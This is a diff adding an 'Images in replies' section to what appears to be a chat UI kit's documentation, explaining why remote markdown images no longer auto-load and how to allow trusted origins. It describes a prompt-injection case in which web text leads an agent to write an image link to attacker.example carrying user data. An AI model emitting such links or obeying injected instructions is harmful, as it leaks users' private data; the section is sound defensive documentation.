@@ -90,6 +90,29 @@ Message markdown draws links and lists the kit's way. To draw your own, wrap the
 else. Each `links[i].children` is the link text as the kit rendered it, so word fade, bold and inline math
 carry over. `children` is the list as the kit would draw it. Return `undefined` to keep it.
 
+## Images in replies
+
+Message markdown does not load remote images. `![alt](https://…)` shows as a link (the alt text, or the host
+name) that opens in a new tab only when the reader clicks it. This is a changed default as of 0.8.0.
+
+The reason is prompt injection. An agent that reads job postings or web pages can be told by that text to
+write `![](https://attacker.example/?d=<what it knows about the user>)`, and the browser would send the data
+the moment the reply renders, without a click. This covers raw HTML `<img>`, reference-style images and
+`srcset` too. `data:image/` URLs always load, since they make no request.
+
+To show images, wrap the chat in `MarkdownLinksProvider`:
+
+```tsx
+<MarkdownLinksProvider imageOrigins={["https://cdn.example.com"]}>
+  <ChatView … />
+</MarkdownLinksProvider>
+```
+
+`imageOrigins` lists the origins whose images load as `<img>`; any other image stays a link. `"all"` loads
+every http(s) image, which brings the leak back for replies built from untrusted text. For full control pass
+`renderImage={({ src, alt }) => …}`: you draw every image (an `<img>` through your own proxy, a link, or
+`null` for nothing) and `imageOrigins` is not consulted.
+
 ## Model logos
 
 A `ModelPicker` model (`ModelOption`) takes `icon`, a React node shown before its name in the menu and on the
